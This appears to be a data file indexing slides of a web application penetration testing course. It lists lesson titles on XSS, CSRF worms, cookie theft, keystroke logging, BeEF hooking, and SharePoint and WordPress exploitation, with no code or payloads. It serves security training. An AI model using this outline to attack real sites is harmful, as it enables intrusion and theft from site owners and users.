S642-2.1.1.179,SEC642,4. Discovering Client-side Issues,,,,,,,,2.1.1: Client-side Issues,179,,,true,,,sec642/43280/index.htm#4,,,,
S642-2.1.1.180,SEC642,5. Server-side Piece Review,,,,,,,,2.1.1: Client-side Issues,180,,,,,,sec642/43280/index.htm#5,,,,
S642-2.1.2.188,SEC642,4. Main Types of XSS,,,,,,,,2.1.2: Cross-Site Scripting,188,,,true,,,sec642/43285/index.htm#4,,,,
S642-2.1.2.189,SEC642,5. XSS Walk-through (1),,,,,,,,2.1.2: Cross-Site Scripting,189,,,true,,,sec642/43285/index.htm#5,,,,
S642-2.1.2.190,SEC642,6. XSS Walk-through (2),,,,,,,,2.1.2: Cross-Site Scripting,190,,,true,,,sec642/43285/index.htm#6,,,,
S642-2.1.2.192,SEC642,8. Discovery Payloads,,,,,,,,2.1.2: Cross-Site Scripting,192,,,true,,,sec642/43285/index.htm#8,,,,
S642-2.1.2.195,SEC642,11. DOM-based XSS Explanation,,,,,,,,2.1.2: Cross-Site Scripting,195,,,true,,,sec642/43285/index.htm#11,,,,
S642-2.1.2.196,SEC642,12. DOM-based XSS Example,,,,,,,,2.1.2: Cross-Site Scripting,196,,,true,,,sec642/43285/index.htm#12,,,,
S642-2.1.2.197,SEC642,13. D-XSS Inputs,,,,,,,,2.1.2: Cross-Site Scripting,197,,,true,,,sec642/43285/index.htm#13,,,,
S642-2.1.2.194,SEC642,10. DOM-based XSS,,,,,,,,2.1.2: Cross-Site Scripting,194,,,true,,,sec642/43285/index.htm#10,,,,
S642-2.1.2.199,SEC642,15. Discovering D-XSS,,,,,,,,2.1.2: Cross-Site Scripting,199,,,true,,,sec642/43285/index.htm#15,,,,
S642-2.1.2.198,SEC642,14. Course Roadmap,,,,,,,,2.1.2: Cross-Site Scripting,198,,,,,,sec642/43285/index.htm#14,,,,
S642-2.1.2.200,SEC642,16. Manual Discovery Technique,,,,,,,,2.1.2: Cross-Site Scripting,200,,,true,,,sec642/43285/index.htm#16,,,,
S642-2.1.2.201,SEC642,17. DOMinator,,,,,,,,2.1.2: Cross-Site Scripting,201,,,true,,,sec642/43285/index.htm#17,,,,
S642-2.1.2.202,SEC642,18. Using DOMinator,,,,,,,,2.1.2: Cross-Site Scripting,202,,,true,,,sec642/43285/index.htm#18,,,,
S642-2.1.2.193,SEC642,9. Course Roadmap,,,,,,,,2.1.2: Cross-Site Scripting,193,,,,,,sec642/43285/index.htm#9,,,,
S642-2.1.2.191,SEC642,7. Discovering XSS,,,,,,,,2.1.2: Cross-Site Scripting,191,,,true,,,sec642/43285/index.htm#7,,,,
S642-2.1.2.203,SEC642,19. Exploiting D-XSS,,,,,,,,2.1.2: Cross-Site Scripting,203,,,true,,,sec642/43285/index.htm#19,,,,
S642-2.1.2.204,SEC642,20. Course Roadmap,,,,,,,,2.1.2: Cross-Site Scripting,204,,,,,,sec642/43285/index.htm#20,,,,
S642-2.1.2.205,SEC642,21. DOM-based XSS Exercise,,,,,,,,2.1.2: Cross-Site Scripting,205,,,,,,sec642/43285/index.htm#21,,,,
S642-2.1.2.206,SEC642,22. Answers Ahead!,,,,,,,,2.1.2: Cross-Site Scripting,206,,,,,,sec642/43285/index.htm#22,,,,
S642-2.1.2.207,SEC642,23. D-XSS Exercise: Examine the Pages for Potential D-XSS,,,,,,,,2.1.2: Cross-Site Scripting,207,,,,,,sec642/43285/index.htm#23,,,,
S642-2.1.2.211,SEC642,27. Review: DOM-Based XSS,,,,,,,,2.1.2: Cross-Site Scripting,211,,,,,,sec642/43285/index.htm#27,,,,
S642-2.1.2.212,SEC642,28. Course Roadmap,,,,,,,,2.1.2: Cross-Site Scripting,212,,,,,,sec642/43285/index.htm#28,,,,
S642-2.1.2.213,SEC642,29. Exploiting XSS,,,,,,,,2.1.2: Cross-Site Scripting,213,,,true,,,sec642/43285/index.htm#29,,,,
S642-2.1.2.214,SEC642,30. Simple Exploits,,,,,,,,2.1.2: Cross-Site Scripting,214,,,true,,,sec642/43285/index.htm#30,,,,
S642-2.1.2.215,SEC642,31. Building a Payload,,,,,,,,2.1.2: Cross-Site Scripting,215,,,true,,,sec642/43285/index.htm#31,,,,
S642-2.1.2.216,SEC642,32. Where is the Payload?,,,,,,,,2.1.2: Cross-Site Scripting,216,,,true,,,sec642/43285/index.htm#32,,,,
S642-2.1.2.209,SEC642,25. D-XSS Exercise: Silent Exploitation,,,,,,,,2.1.2: Cross-Site Scripting,209,,,,,,sec642/43285/index.htm#25,,,,
S642-2.1.2.218,SEC642,34. Course Roadmap,,,,,,,,2.1.2: Cross-Site Scripting,218,,,,,,sec642/43285/index.htm#34,,,,
S642-2.1.2.219,SEC642,35. Advanced XSS Exploits,,,,,,,,2.1.2: Cross-Site Scripting,219,,,true,,,sec642/43285/index.htm#35,,,,
S642-2.1.2.220,SEC642,36. Abusing Features,,,,,,,,2.1.2: Cross-Site Scripting,220,,,true,,,sec642/43285/index.htm#36,,,,
S642-2.1.2.221,SEC642,37. Browser Support,,,,,,,,2.1.2: Cross-Site Scripting,221,,,true,,,sec642/43285/index.htm#37,,,,
S642-2.1.2.222,SEC642,38. Payload Ideas,,,,,,,,2.1.2: Cross-Site Scripting,222,,,true,,,sec642/43285/index.htm#38,,,,
S642-2.1.2.208,SEC642,24. D-XSS Exercise: Exploiting the Vulnerability,,,,,,,,2.1.2: Cross-Site Scripting,208,,,,,,sec642/43285/index.htm#24,,,,
S642-2.1.2.210,SEC642,26. Exploit the D-XSS flaws,,,,,,,,2.1.2: Cross-Site Scripting,210,,,true,,,sec642/43285/index.htm#26,,,,
S642-2.1.2.223,SEC642,39. Stealth Cookie Theft,,,,,,,,2.1.2: Cross-Site Scripting,223,,,true,,,sec642/43285/index.htm#39,,,,
S642-2.1.2.226,SEC642,42. Keystroke Logging,,,,,,,,2.1.2: Cross-Site Scripting,226,,,true,,,sec642/43285/index.htm#42,,,,
S642-2.1.2.227,SEC642,43. Scriptless Attacks,,,,,,,,2.1.2: Cross-Site Scripting,227,,,true,,,sec642/43285/index.htm#43,,,,
S642-2.1.2.217,SEC642,33. What to Accomplish?,,,,,,,,2.1.2: Cross-Site Scripting,217,,,true,,,sec642/43285/index.htm#33,,,,
S642-2.1.2.229,SEC642,45. Course Roadmap,,,,,,,,2.1.2: Cross-Site Scripting,229,,,,,,sec642/43285/index.htm#45,,,,
S642-2.1.2.225,SEC642,41. DNS Harvesting,,,,,,,,2.1.2: Cross-Site Scripting,225,,,true,,,sec642/43285/index.htm#41,,,,
S642-2.1.2.224,SEC642,40. Geolocation,,,,,,,,2.1.2: Cross-Site Scripting,224,,,true,,,sec642/43285/index.htm#40,,,,
S642-2.1.2.228,SEC642,44. Scriptless Examples,,,,,,,,2.1.2: Cross-Site Scripting,228,,,true,,,sec642/43285/index.htm#44,,,,
S642-2.1.2.230,SEC642,46. BeEF,,,,,,,,2.1.2: Cross-Site Scripting,230,,,true,,,sec642/43285/index.htm#46,,,,
S642-2.1.2.231,SEC642,47. BeEF Interface,,,,,,,,2.1.2: Cross-Site Scripting,231,,,true,,,sec642/43285/index.htm#47,,,,
S642-2.1.2.232,SEC642,48. Using BeEF,,,,,,,,2.1.2: Cross-Site Scripting,232,,,true,,,sec642/43285/index.htm#48,,,,
S642-2.1.2.233,SEC642,49. BeEF Modules,,,,,,,,2.1.2: Cross-Site Scripting,233,,,true,,,sec642/43285/index.htm#49,,,,
S642-2.1.2.234,SEC642,50. Metasploit Integration,,,,,,,,2.1.2: Cross-Site Scripting,234,,,true,,,sec642/43285/index.htm#50,,,,
S642-2.1.2.235,SEC642,51. Tunneling Proxy,,,,,,,,2.1.2: Cross-Site Scripting,235,,,true,,,sec642/43285/index.htm#51,,,,
S642-2.1.2.239,SEC642,55. Answers Ahead!,,,,,,,,2.1.2: Cross-Site Scripting,239,,,,,,sec642/43285/index.htm#55,,,,
S642-2.1.2.240,SEC642,56. XSS Exercise: Test XSS Flaw,,,,,,,,2.1.2: Cross-Site Scripting,240,,,,,,sec642/43285/index.htm#56,,,,
S642-2.1.2.241,SEC642,57. XSS Exercise: Build XSS Exploits,,,,,,,,2.1.2: Cross-Site Scripting,241,,,,,,sec642/43285/index.htm#57,,,,
S642-2.1.2.242,SEC642,58. XSS Exercise: Launch BeEF,,,,,,,,2.1.2: Cross-Site Scripting,242,,,,,,sec642/43285/index.htm#58,,,,
S642-2.1.2.243,SEC642,59. XSS Exercise: Inject a BeEF Hook,,,,,,,,2.1.2: Cross-Site Scripting,243,,,,,,sec642/43285/index.htm#59,,,,
S642-2.1.2.244,SEC642,60. XSS Exercise: Use the Modules,,,,,,,,2.1.2: Cross-Site Scripting,244,,,,,,sec642/43285/index.htm#60,,,,
S642-2.1.2.245,SEC642,61. Review: XSS Exercise,,,,,,,,2.1.2: Cross-Site Scripting,245,,,,,,sec642/43285/index.htm#61,,,,
S642-2.1.3.246,SEC642,2.1.3: Cross-Site Request Forgery,,,,,,,,2.1.3: Cross-Site Request Forgery,246,,,true,,,sec642/43290/index.htm,,,,
S642-2.1.3.247,SEC642,2. Cross-site Request Forgery,,,,,,,,2.1.3: Cross-Site Request Forgery,247,,,true,,,sec642/43290/index.htm#2,,,,
S642-2.1.3.248,SEC642,3. XSRF Walk-through (1),,,,,,,,2.1.3: Cross-Site Request Forgery,248,,,true,,,sec642/43290/index.htm#3,,,,
S642-2.1.3.249,SEC642,4. XSRF Walk-through (2),,,,,,,,2.1.3: Cross-Site Request Forgery,249,,,true,,,sec642/43290/index.htm#4,,,,
S642-2.1.3.250,SEC642,5. Cross-site Request Forgery Concerns,,,,,,,,2.1.3: Cross-Site Request Forgery,250,,,true,,,sec642/43290/index.htm#5,,,,
S642-2.1.2.237,SEC642,53. Course Roadmap,,,,,,,,2.1.2: Cross-Site Scripting,237,,,,,,sec642/43285/index.htm#53,,,,
S642-2.1.3.252,SEC642,7. Course Roadmap,,,,,,,,2.1.3: Cross-Site Request Forgery,252,,,,,,sec642/43290/index.htm#7,,,,
S642-2.1.2.236,SEC642,52. XSSRays,,,,,,,,2.1.2: Cross-Site Scripting,236,,,true,,,sec642/43285/index.htm#52,,,,
S642-2.1.2.238,SEC642,54. XSS Exploits Exercise,,,,,,,,2.1.2: Cross-Site Scripting,238,,,,,,sec642/43285/index.htm#54,,,,
S642-2.1.3.251,SEC642,6. Detecting XSRF,,,,,,,,2.1.3: Cross-Site Request Forgery,251,,,true,,,sec642/43290/index.htm#6,,,,
S642-2.1.3.253,SEC642,8. Exploiting XSRF,,,,,,,,2.1.3: Cross-Site Request Forgery,253,,,true,,,sec642/43290/index.htm#8,,,,
S642-2.1.3.257,SEC642,12. AJAX-based Code,,,,,,,,2.1.3: Cross-Site Request Forgery,257,,,true,,,sec642/43290/index.htm#12,,,,
S642-2.1.3.258,SEC642,13. .NET ViewState,,,,,,,,2.1.3: Cross-Site Request Forgery,258,,,true,,,sec642/43290/index.htm#13,,,,
S642-2.1.3.259,SEC642,14. Course Roadmap,,,,,,,,2.1.3: Cross-Site Request Forgery,259,,,,,,sec642/43290/index.htm#14,,,,
S642-2.1.3.260,SEC642,15. Combining XSS and XSRF,,,,,,,,2.1.3: Cross-Site Request Forgery,260,,,true,,,sec642/43290/index.htm#15,,,,
S642-2.1.3.261,SEC642,16. Automating the Attack,,,,,,,,2.1.3: Cross-Site Request Forgery,261,,,true,,,sec642/43290/index.htm#16,,,,
S642-2.1.3.262,SEC642,17. Bypassing Anti-XSRF,,,,,,,,2.1.3: Cross-Site Request Forgery,262,,,true,,,sec642/43290/index.htm#17,,,,
S642-2.1.3.255,SEC642,10. POST-based Code,,,,,,,,2.1.3: Cross-Site Request Forgery,255,,,true,,,sec642/43290/index.htm#10,,,,
S642-2.1.3.254,SEC642,9. POST-based XSRF,,,,,,,,2.1.3: Cross-Site Request Forgery,254,,,true,,,sec642/43290/index.htm#9,,,,
S642-2.1.3.256,SEC642,11. AJAX Exploitation,,,,,,,,2.1.3: Cross-Site Request Forgery,256,,,true,,,sec642/43290/index.htm#11,,,,
S642-2.1.3.264,SEC642,19. AJAX and XSRF Redux,,,,,,,,2.1.3: Cross-Site Request Forgery,264,,,true,,,sec642/43290/index.htm#19,,,,
S642-2.1.3.267,SEC642,22. Course Roadmap,,,,,,,,2.1.3: Cross-Site Request Forgery,267,,,,,,sec642/43290/index.htm#22,,,,
S642-2.1.3.263,SEC642,18. Self-replicating Exploit,,,,,,,,2.1.3: Cross-Site Request Forgery,263,,,true,,,sec642/43290/index.htm#18,,,,
S642-2.1.3.265,SEC642,20. XSRF/XSS Walk-through (1),,,,,,,,2.1.3: Cross-Site Request Forgery,265,,,true,,,sec642/43290/index.htm#20,,,,
S642-2.1.3.266,SEC642,21. XSRF/XSS Walk-through (2),,,,,,,,2.1.3: Cross-Site Request Forgery,266,,,true,,,sec642/43290/index.htm#21,,,,
S642-2.1.3.268,SEC642,23. XSS/XSRF Exploits Exercise,,,,,,,,2.1.3: Cross-Site Request Forgery,268,,,,,,sec642/43290/index.htm#23,,,,
S642-2.1.3.269,SEC642,24. Answers Ahead!,,,,,,,,2.1.3: Cross-Site Request Forgery,269,,,,,,sec642/43290/index.htm#24,,,,
S642-2.1.3.270,SEC642,25. XSS/XSRF Exercise: Use the System,,,,,,,,2.1.3: Cross-Site Request Forgery,270,,,,,,sec642/43290/index.htm#25,,,,
S642-2.1.3.271,SEC642,26. XSS/XSRF Exercise: Evaluate the Comment Function,,,,,,,,2.1.3: Cross-Site Request Forgery,271,,,,,,sec642/43290/index.htm#26,,,,
S642-2.1.3.272,SEC642,27. XSS/XSRF Exercise: Build an XSRF Exploit,,,,,,,,2.1.3: Cross-Site Request Forgery,272,,,,,,sec642/43290/index.htm#27,,,,
S642-2.1.3.273,SEC642,28. XSS/XSRF Exercise: Testing the XSRF Exploit,,,,,,,,2.1.3: Cross-Site Request Forgery,273,,,,,,sec642/43290/index.htm#28,,,,
S642-2.1.3.274,SEC642,29. XSS/XSRF Exercise: Adding an XSS payload to the XSRF,,,,,,,,2.1.3: Cross-Site Request Forgery,274,,,,,,sec642/43290/index.htm#29,,,,
S642-2.1.3.275,SEC642,30. XSS/XSRF Exercise: Load the Exploit File,,,,,,,,2.1.3: Cross-Site Request Forgery,275,,,,,,sec642/43290/index.htm#30,,,,
S642-2.1.3.276,SEC642,31. Review: XSS/XSRF Worm,,,,,,,,2.1.3: Cross-Site Request Forgery,276,,,,,,sec642/43290/index.htm#31,,,,
S642-2.1.4.277,SEC642,2.1.4: Target-specific Testing : SharePoint and WordPress,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,277,,,true,,,sec642/43295/index.htm,,,,
S642-2.1.4.278,SEC642,2. Target-specific Testing,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,278,,,true,,,sec642/43295/index.htm#2,,,,
S642-2.1.4.282,SEC642,6. Blind Elephant / Fury,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,282,,,true,,,sec642/43295/index.htm#6,,,,
S642-2.1.4.283,SEC642,7. Course Roadmap,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,283,,,,,,sec642/43295/index.htm#7,,,,
S642-2.1.4.284,SEC642,8. Blind Elephant Exercise,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,284,,,,,,sec642/43295/index.htm#8,,,,
S642-2.1.4.285,SEC642,9. Answers Ahead!,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,285,,,,,,sec642/43295/index.htm#9,,,,
S642-2.1.4.286,SEC642,10. Blind Elephant Exercise: Launch Blind Elephant,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,286,,,,,,sec642/43295/index.htm#10,,,,
S642-2.1.4.287,SEC642,11. Blind Elephant Exercise: Scan Target,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,287,,,,,,sec642/43295/index.htm#11,,,,
S642-2.1.4.288,SEC642,12. Review: Blind Elephant,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,288,,,,,,sec642/43295/index.htm#12,,,,
S642-2.1.4.289,SEC642,13. Course Roadmap,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,289,,,,,,sec642/43295/index.htm#13,,,,
S642-2.1.4.290,SEC642,14. SharePoint,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,290,,,true,,,sec642/43295/index.htm#14,,,,
S642-2.1.4.291,SEC642,15. SharePoint Versions,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,291,,,true,,,sec642/43295/index.htm#15,,,,
S642-2.1.4.292,SEC642,16. SharePoint Editions,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,292,,,true,,,sec642/43295/index.htm#16,,,,
S642-2.1.4.293,SEC642,17. SharePoint Features,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,293,,,true,,,sec642/43295/index.htm#17,,,,
S642-2.1.4.280,SEC642,4. Understanding the Target,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,280,,,true,,,sec642/43295/index.htm#4,,,,
S642-2.1.4.295,SEC642,19. Course Roadmap,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,295,,,,,,sec642/43295/index.htm#19,,,,
S642-2.1.4.279,SEC642,3. Changes to the Methodology,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,279,,,true,,,sec642/43295/index.htm#3,,,,
S642-2.1.4.281,SEC642,5. Identifying the Target,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,281,,,true,,,sec642/43295/index.htm#5,,,,
S642-2.1.4.296,SEC642,20. Common Issues with SharePoint,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,296,,,true,,,sec642/43295/index.htm#20,,,,
S642-2.1.4.299,SEC642,23. Improper Permission Exploitation,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,299,,,true,,,sec642/43295/index.htm#23,,,,
S642-2.1.4.300,SEC642,24. Default Pages,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,300,,,true,,,sec642/43295/index.htm#24,,,,
S642-2.1.4.294,SEC642,18. Web Parts,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,294,,,true,,,sec642/43295/index.htm#18,,,,
S642-2.1.4.297,SEC642,21. Improper Permissions,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,297,,,true,,,sec642/43295/index.htm#21,,,,
S642-2.1.4.298,SEC642,22. Improper Permission Discovery,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,298,,,true,,,sec642/43295/index.htm#22,,,,
S642-2.1.4.304,SEC642,28. Vulnerability Discovery,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,304,,,true,,,sec642/43295/index.htm#28,,,,
S642-2.1.4.305,SEC642,29. Vulnerability Exploitation,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,305,,,true,,,sec642/43295/index.htm#29,,,,
S642-2.1.4.306,SEC642,30. Content Issues,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,306,,,true,,,sec642/43295/index.htm#30,,,,
S642-2.1.4.307,SEC642,31. Malware,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,307,,,true,,,sec642/43295/index.htm#31,,,,
S642-2.1.4.308,SEC642,32. Executable Content,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,308,,,true,,,sec642/43295/index.htm#32,,,,
S642-2.1.4.309,SEC642,33. Attacking Clients through SharePoint,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,309,,,true,,,sec642/43295/index.htm#33,,,,
S642-2.1.4.302,SEC642,26. Default Page Exploitation,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,302,,,true,,,sec642/43295/index.htm#26,,,,
S642-2.1.4.301,SEC642,25. Default Page Discovery,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,301,,,true,,,sec642/43295/index.htm#25,,,,
S642-2.1.4.303,SEC642,27. SharePoint & Web Part Vulnerabilities,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,303,,,true,,,sec642/43295/index.htm#27,,,,
S642-2.1.4.311,SEC642,35. SharePoint Exercise,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,311,,,,,,sec642/43295/index.htm#35,,,,
S642-2.1.4.310,SEC642,34. Course Roadmap,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,310,,,,,,sec642/43295/index.htm#34,,,,
S642-2.1.4.312,SEC642,36. Answers Ahead!,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,312,,,,,,sec642/43295/index.htm#36,,,,
S642-2.1.4.313,SEC642,37. SharePoint Exercise: Authenticate and Map,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,313,,,,,,sec642/43295/index.htm#37,,,,
S642-2.1.4.314,SEC642,38. SharePoint Exercise: Launch BeEF,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,314,,,,,,sec642/43295/index.htm#38,,,,
S642-2.1.4.315,SEC642,39. SharePoint Exercise: Create a HTML Exploit Page,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,315,,,,,,sec642/43295/index.htm#39,,,,
S642-2.1.4.319,SEC642,43. WordPress,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,319,,,true,,,sec642/43295/index.htm#43,,,,
S642-2.1.4.320,SEC642,44. WordPress Design and Architecture,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,320,,,true,,,sec642/43295/index.htm#44,,,,
S642-2.1.4.321,SEC642,45. WordPress Features,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,321,,,true,,,sec642/43295/index.htm#45,,,,
S642-2.1.4.317,SEC642,41. Review: SharePoint,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,317,,,,,,sec642/43295/index.htm#41,,,,
S642-2.1.4.322,SEC642,46. WordPress Themes,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,322,,,true,,,sec642/43295/index.htm#46,,,,
S642-2.1.4.323,SEC642,47. WordPress Plugins,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,323,,,true,,,sec642/43295/index.htm#47,,,,
S642-2.1.4.324,SEC642,48. Course Roadmap,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,324,,,,,,sec642/43295/index.htm#48,,,,
S642-2.1.4.316,SEC642,40. SharePoint Exercise: Exploit the Browser,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,316,,,,,,sec642/43295/index.htm#40,,,,
S642-2.1.4.318,SEC642,42. Course Roadmap,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,318,,,,,,sec642/43295/index.htm#42,,,,
S642-2.1.4.328,SEC642,52. Course Roadmap,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,328,,,,,,sec642/43295/index.htm#52,,,,
S642-2.1.4.329,SEC642,53. WPScan,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,329,,,true,,,sec642/43295/index.htm#53,,,,
S642-2.1.4.330,SEC642,54. Running WPScan,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,330,,,true,,,sec642/43295/index.htm#54,,,,
S642-2.1.4.331,SEC642,55. Course Roadmap,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,331,,,,,,sec642/43295/index.htm#55,,,,
S642-2.1.4.332,SEC642,56. WordPress Exercise,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,332,,,,,,sec642/43295/index.htm#56,,,,
S642-2.1.4.333,SEC642,57. Answers Ahead!,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,333,,,,,,sec642/43295/index.htm#57,,,,
S642-2.1.4.334,SEC642,58. WordPress Exercise: Launch Burp and Register,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,334,,,,,,sec642/43295/index.htm#58,,,,
S642-2.1.4.335,SEC642,59. Map WordPress,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,335,,,true,,,sec642/43295/index.htm#59,,,,
S642-2.1.4.336,SEC642,60. Run WPScan,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,336,,,true,,,sec642/43295/index.htm#60,,,,
S642-2.1.4.337,SEC642,61. Exploit a Vulnerability Found,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,337,,,true,,,sec642/43295/index.htm#61,,,,
S642-2.1.4.338,SEC642,62. Review: WordPress,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,338,,,,,,sec642/43295/index.htm#62,,,,
S642-2.1.4.339,SEC642,63. Course Roadmap,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,339,,,,,,sec642/43295/index.htm#63,,,,
S642-2.1.4.340,SEC642,64. Conclusions,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,340,,,,,,sec642/43295/index.htm#64,,,,
S642-3.1.1.341,SEC642,3.1.1: Web App. Crypto Attacks,,,,,,,,3.1.1: Web App. Crypto Attacks,341,,,true,,,sec642/43300/index.htm,,,,
S642-3.1.1.342,SEC642,2. Course Roadmap,,,,,,,,3.1.1: Web App. Crypto Attacks,342,,,,,,sec642/43300/index.htm#2,,,,
S642-3.1.1.343,SEC642,3. Web App. Crypto Attacks,,,,,,,,3.1.1: Web App. Crypto Attacks,343,,,true,,,sec642/43300/index.htm#3,,,,
S642-3.1.1.344,SEC642,4. Cryptography Introduction,,,,,,,,3.1.1: Web App. Crypto Attacks,344,,,true,,,sec642/43300/index.htm#4,,,,
S642-3.1.1.345,SEC642,5. Authentication Controls,,,,,,,,3.1.1: Web App. Crypto Attacks,345,,,true,,,sec642/43300/index.htm#5,,,,
S642-2.1.4.325,SEC642,49. Testing WordPress,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,325,,,true,,,sec642/43295/index.htm#49,,,,
S642-2.1.4.326,SEC642,50. Mapping Features,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,326,,,true,,,sec642/43295/index.htm#50,,,,
S642-2.1.4.327,SEC642,51. Determining Versions,,,,,,,,2.1.4: Target-specific Testing : SharePoint and WordPress,327,,,true,,,sec642/43295/index.htm#51,,,,
S642-3.1.1.346,SEC642,6. Encrypted CAPTCHAs,,,,,,,,3.1.1: Web App. Crypto Attacks,346,,,true,,,sec642/43300/index.htm#6,,,,
S642-3.1.1.347,SEC642,7. Non-Repudiation,,,,,,,,3.1.1: Web App. Crypto Attacks,347,,,true,,,sec642/43300/index.htm#7,,,,
S642-3.1.1.348,SEC642,8. Hashing Functions,,,,,,,,3.1.1: Web App. Crypto Attacks,348,,,true,,,sec642/43300/index.htm#8,,,,
S642-3.1.1.349,SEC642,9. HMAC Hashing,,,,,,,,3.1.1: Web App. Crypto Attacks,349,,,true,,,sec642/43300/index.htm#9,,,,
S642-3.1.1.350,SEC642,10. Hashing Collisions,,,,,,,,3.1.1: Web App. Crypto Attacks,350,,,true,,,sec642/43300/index.htm#10,,,,
S642-3.1.1.354,SEC642,14. Postscript Collision Logic,,,,,,,,3.1.1: Web App. Crypto Attacks,354,,,true,,,sec642/43300/index.htm#14,,,,
S642-3.1.1.355,SEC642,15. Hash Collision Web Attacks,,,,,,,,3.1.1: Web App. Crypto Attacks,355,,,true,,,sec642/43300/index.htm#15,,,,
S642-3.1.1.356,SEC642,16. Confidentiality Controls,,,,,,,,3.1.1: Web App. Crypto Attacks,356,,,true,,,sec642/43300/index.htm#16,,,,
S642-3.1.1.357,SEC642,17. Stream Cipher,,,,,,,,3.1.1: Web App. Crypto Attacks,357,,,true,,,sec642/43300/index.htm#17,,,,
S642-3.1.1.358,SEC642,18. Block Cipher,,,,,,,,3.1.1: Web App. Crypto Attacks,358,,,true,,,sec642/43300/index.htm#18,,,,
S642-3.1.1.359,SEC642,19. Electronic Codebook Mode (ECB),,,,,,,,3.1.1: Web App. Crypto Attacks,359,,,true,,,sec642/43300/index.htm#19,,,,
S642-3.1.1.360,SEC642,20. Web Framework ECB,,,,,,,,3.1.1: Web App. Crypto Attacks,360,,,true,,,sec642/43300/index.htm#20,,,,
S642-3.1.1.361,SEC642,21. Explaining ECB Weakness,,,,,,,,3.1.1: Web App. Crypto Attacks,361,,,true,,,sec642/43300/index.htm#21,,,,
S642-3.1.1.362,SEC642,22. ECB_Encrypt_Image,,,,,,,,3.1.1: Web App. Crypto Attacks,362,,,true,,,sec642/43300/index.htm#22,,,,
S642-3.1.1.363,SEC642,23. Cipher Block Chaining Mode,,,,,,,,3.1.1: Web App. Crypto Attacks,363,,,true,,,sec642/43300/index.htm#23,,,,
S642-3.1.1.364,SEC642,24. CBC IV,,,,,,,,3.1.1: Web App. Crypto Attacks,364,,,true,,,sec642/43300/index.htm#24,,,,
S642-3.1.1.365,SEC642,25. CTR Mode,,,,,,,,3.1.1: Web App. Crypto Attacks,365,,,true,,,sec642/43300/index.htm#25,,,,
S642-3.1.1.366,SEC642,26. Confidentiality and Integrity,,,,,,,,3.1.1: Web App. Crypto Attacks,366,,,true,,,sec642/43300/index.htm#26,,,,
S642-3.1.1.367,SEC642,27. CCMP,,,,,,,,3.1.1: Web App. Crypto Attacks,367,,,true,,,sec642/43300/index.htm#27,,,,
S642-3.1.1.368,SEC642,28. Module Summary,,,,,,,,3.1.1: Web App. Crypto Attacks,368,,,true,,,sec642/43300/index.htm#28,,,,
S642-3.1.2.369,SEC642,3.1.2: Identifying Crypto,,,,,,,,3.1.2: Identifying Crypto,369,,,true,,,sec642/43305/index.htm,,,,
S642-3.1.2.370,SEC642,2. Cryptography in Web Applications,,,,,,,,3.1.2: Identifying Crypto,370,,,true,,,sec642/43305/index.htm#2,,,,
